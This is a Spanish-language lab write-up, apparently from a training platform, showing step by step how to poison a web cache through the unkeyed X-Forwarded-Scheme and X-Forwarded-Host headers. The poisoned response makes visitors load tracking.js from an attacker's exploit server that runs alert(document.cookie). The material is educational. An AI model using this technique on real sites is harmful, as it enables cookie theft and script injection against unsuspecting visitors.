# 🧪 Web Cache Poisoning con múltiples cabeceras HTTP

## 📄 Descripción del laboratorio

Este laboratorio es vulnerable a **Web Cache Poisoning** mediante el uso combinado de varias cabeceras HTTP.

La aplicación utiliza ciertas cabeceras relacionadas con proxies para generar URLs y recursos dinámicos. Sin embargo, estas cabeceras **no forman parte de la cache key**, lo que permite manipular la respuesta que posteriormente será almacenada en caché.

Un usuario legítimo visita la página principal aproximadamente **una vez por minuto**, por lo que si logramos envenenar la caché podremos hacer que ese usuario reciba una respuesta manipulada.

El objetivo del laboratorio es **envenenar la caché con una respuesta que ejecute `alert(document.cookie)` en el navegador de la víctima**.



## 📚 Teoría

En este laboratorio se analiza un escenario de **Web Cache Poisoning más avanzado**, en el que una sola cabecera no es suficiente para explotar el fallo, pero **la combinación de varias cabeceras no indexadas permite manipular la respuesta cacheada**.

### 📌 Qué hace el backend

El servidor utiliza cabeceras relacionadas con proxies inversos, como:

* `X-Forwarded-Scheme`
* `X-Forwarded-Host`

Estas cabeceras suelen emplearse para reconstruir la URL original cuando el servidor está detrás de un **reverse proxy o un load balancer**.

El problema ocurre porque:

* El backend **confía en los valores de estas cabeceras** para construir URLs.
* La infraestructura de caché **no incluye estas cabeceras en la cache key**.

Esto provoca una situación peligrosa:

1. El atacante manipula las cabeceras.
2. El backend genera una respuesta basada en esos valores.
3. La caché **almacena esa respuesta manipulada**.
4. Otros usuarios reciben la respuesta maliciosa.

### 📌 El fallo concreto

Las cabeceras vulnerables son:

* `X-Forwarded-Scheme` → controla el esquema (`http` / `https`)
* `X-Forwarded-Host` → controla el dominio

Al combinarlas, es posible hacer que el servidor **genere URLs hacia un dominio externo controlado por el atacante**.

La respuesta resultante parece válida para el backend, por lo que **la caché la almacena**. Posteriormente, los navegadores de los usuarios cargan recursos desde ese dominio externo, ejecutando JavaScript malicioso.



## 📝 Práctica

### 1️⃣ Enumerar cabeceras interesantes

Interceptamos la petición a la página principal (`/`) y utilizamos **Param Miner** para buscar cabeceras que influyan en la respuesta.

<img width="1407" height="323" alt="image" src="https://github.com/user-attachments/assets/0c07126c-6729-426e-9907-49893110b7c2" />
<br>

Procedimiento:

* Click derecho sobre la petición.
* Seleccionar **Guess headers**.
* Revisar los resultados en la pestaña **Issues**.

Param Miner detecta varias cabeceras interesantes, entre ellas:

```http
X-Forwarded-Scheme
X-Forwarded-Host
```



### 2️⃣ Probar la combinación de cabeceras

Enviamos la petición a **Burp Repeater** y añadimos las siguientes cabeceras:

```http
X-Forwarded-Scheme: http
X-Forwarded-Host: test.com
```

<img width="1009" height="324" alt="image" src="https://github.com/user-attachments/assets/fc35569d-157b-4333-a0c1-e82a9f51dcab" />
<br>

Al enviar la petición observamos que el servidor:

* Genera URLs basadas en estos valores.
* Puede provocar redirecciones o carga de recursos externos.

Esto confirma que:

* Ambas cabeceras **influyen en la respuesta generada**.
* Ninguna forma parte de la **cache key**.



### 3️⃣ Detectar el recurso JavaScript vulnerable

Revisando el historial de peticiones, encontramos una solicitud al recurso:

```
/resources/js/tracking.js
```

La respuesta contiene un uso de:

```javascript
document.write(...)
```

<img width="1470" height="311" alt="image" src="https://github.com/user-attachments/assets/7fd515ab-52c9-45cf-8cc3-55e480b6a556" />
<br>

Este patrón es peligroso porque permite **insertar contenido directamente en el DOM**.

Esto es clave para el ataque:

Si logramos controlar **desde dónde se carga ese archivo JavaScript**, podremos ejecutar código arbitrario en el navegador del usuario.



### 4️⃣ Preparar el exploit

Accedemos al **Exploit Server** y creamos un archivo con la siguiente ruta exacta:

```
/resources/js/tracking.js
```

Contenido del archivo:

```javascript
alert(document.cookie);
```

<img width="760" height="867" alt="image" src="https://github.com/user-attachments/assets/edc126ef-3e75-4b40-8664-ae1f7f1a727c" />
<br>

Guardamos el exploit en el servidor.



### 5️⃣ Envenenar la caché

Volvemos a **Burp Repeater** y enviamos la petición con las siguientes cabeceras:

```http
X-Forwarded-Scheme: http
X-Forwarded-Host: EXPLOIT-SERVER.net
```

Seguimos la redirección (**Follow redirection**).

<img width="1428" height="328" alt="image" src="https://github.com/user-attachments/assets/c4b1e07d-9690-433a-a02c-fde0eaf6ff2c" />
<br>

En la respuesta observamos que el contenido cargado incluye:

```javascript
alert(document.cookie);
```

Esto confirma que:

* La respuesta manipulada ha sido **almacenada en caché**.
* La combinación de cabeceras **no forma parte de la cache key**.



### 6️⃣ Impacto en la víctima

Durante el tiempo de vida de la caché:

* Cualquier usuario que visite la página principal
* Recibirá el recurso JavaScript desde el **Exploit Server**

El navegador ejecutará automáticamente:

```javascript
alert(document.cookie);
```

El laboratorio detecta la ejecución del payload en el navegador del visitante y se completa.
